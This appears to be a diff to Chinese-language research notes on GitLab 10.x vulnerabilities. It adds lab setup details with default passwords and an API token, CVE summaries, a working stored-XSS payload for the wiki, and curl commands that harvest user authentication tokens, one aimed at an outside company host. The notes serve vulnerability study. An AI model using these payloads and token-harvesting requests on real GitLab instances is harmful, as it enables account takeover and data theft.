@@ -38,6 +38,40 @@ xxx
 
 http://101.200.219.201:8000/anjing/gitlab-tutorial
 
+自己安装的机子：
+
+10.3.3
+http://192.168.72.133/help
+
+root/12345678
+
+test123/12345678
+
+10.3.4
+http://192.168.72.134/help
+
+root/12345678
+
+## 操作
+
+```
+生成token
+WK5GMhsxfAYnagBbhZGh
+
+查看自己的ID
+curl --header “PRIVATE-TOKEN: WK5GMhsxfAYnagBbhZGh http://192.168.72.133/api/v4/users?username=test123
+
+[{"id":2,"name":"test123","username":"test123","state":"active","avatar_url":"http://www.gravatar.com/avatar/b642b4217b34b1e8d3bd915fc65c4452?s=80\u0026d=identicon","web_url":"http://192.168.72.133/test123"}]
+
+查看Project
+curl -XGET --header "PRIVATE-TOKEN: WK5GMhsxfAYnagBbhZGh" "http://192.168.72.133/api/v3/projects/owned"
+
+
+
+curl --header "PRIVATE-TOKEN: WK5GMhsxfAYnagBbhZGh" https://192.168.72.133/api/v4/projects/4/labels
+
+```
+
 
 ## 安装
 
@@ -70,13 +104,6 @@ vim /etc/gitlab/gitlab.rb
 4
 gitlab-ctl reconfigure
 ```
-
-10.3.3
-http://192.168.72.133/help
-
-10.3.4
-http://192.168.72.134/help
-
 
 报错与fix:
 
@@ -294,6 +321,12 @@ https://gitlab.com/gitlab-org/gitlab-ce/commit/7c4f7c283d8ae69ddfdc5feefbe31aab1
 
 https://gitlab.com/gitlab-org/gitlab-ce/commit/056d35cad0e09a59fdf44cb6bd7063f73a970f01
 
+可以通过以下链接查找
+
+https://gitlab.com/gitlab-org/gitlab-ce/commits/master?utf8=%E2%9C%93&search=security-10-3
+
+
+
 下载：
 
 https://github.com/gitlabhq/gitlabhq/releases/tag/v10.3.4
@@ -348,6 +381,17 @@ GitLab CE and EE 10.2.0 - 10.2.5
 GitLab CE and EE 10.3.0 - 10.3.3
 
 
+**Note:** The `cache:key` variable cannot contain the `/` character, or the equivalent URI encoded `%2F`; a value made only of dots (`.`, `%2E`) is also forbidden.
+
+`cache:key` should not allow to traverse path, this commit
+ensure that no `/` or `%2F` will pass `gitlab-ci.yml` validation.
+
+It will also prevent the usage of `cache:key` made only of dots
+like `.`, `..` and the equivalent URI encoded representation
+
+
+
+
 ## Jupyter Notebook XSS（CVE-2017-0923）
 
 具有 Jupyter Notebooks 的项目可以执行外部 JavaScript。这个 XSS 漏洞是由 Jupyter Notebooks 中的无标签输出引起的。输出现在在渲染之前已经过正确的审查。此漏洞被标记为 CVE-2017-0923。
@@ -361,3 +405,89 @@ GitLab CE and EE 10.0.0 - 10.1.5
 GitLab CE and EE 10.2.0 - 10.2.5
 
 GitLab CE and EE 10.3.0 - 10.3.3
+
+
+## Sensitive Fields Exposed to Admins / Masters in the Services API (CVE-2017-0925)
+
+
+Versions Affected
+
+GitLab CE and EE 8.0.0 - 9.5.10
+
+GitLab CE and EE 10.0.0 - 10.1.5
+
+GitLab CE and EE 10.2.0 - 10.2.5
+
+GitLab CE and EE 10.3.0 - 10.3.3
+
+https://hackerone.com/reports/195088
+
+
+
+
+
+
+
+
+
+## Login with Disabled OAuth Provider via POST
+
+OAauth providers are configured per instance and can be disabled from the Admin settings page under "Sign-in Restrictions".
+
+It was possible to login with a disabled OAuth provider when bypassing the form with a malicious request. A check has been added to prevent this. This issue has been assigned to CVE-2017-0926.
+
+Thanks to Steve Norman for responsibly disclosing this issue to us.
+
+Versions Affected
+
+GitLab CE and EE 8.8.0 - 9.5.10
+
+GitLab CE and EE 10.0.0 - 10.1.5
+
+GitLab CE and EE 10.2.0 - 10.2.5
+
+GitLab CE and EE 10.3.0 - 10.3.3
+
+
+## Critical SQL Injection in MilestoneFinder
+
+A SQL injection vulnerability was discovered in the MilestoneFinder component. The affected SQL query has now been mitigated. This issue has been assigned to CVE-2017-0914.
+
+Versions Affected
+
+GitLab CE and EE 9.4.0 - 9.5.10
+
+GitLab CE and EE 10.0.0 - 10.1.5
+
+GitLab CE and EE 10.2.0 - 10.2.5
+
+GitLab CE and EE 10.3.0 - 10.3.3
+
+
+## [Markdown] Stored XSS via character encoding parser bypass
+
+
+GitLab 10.0
+
+https://hackerone.com/reports/270999
+
+wiki处，编辑page，抓并修改content内容
+
+payload：
+```js
+%3Ca+href%3D%22%01java%03script%3Aconfirm%28document.domain%29%22%3EClick+to+execute%3Ca%3E%0D%0A
+```
+![](pic/gitlab1.jpg)
+
+
+
+## GitLab 10.0 RC2 returning _all_ user data in the /users API endpoint, including tokens
+
+```
+curl -s --request GET https://192.168.72.133/api/v4/users/951422 | jq '.authentication_token'
+
+curl -s --request GET http://192.168.72.133/api/v4/users/1
+
+curl -s --request GET http://git.tophant.com/api/v4/users/1 | jq '.authentication_token'
+
+```
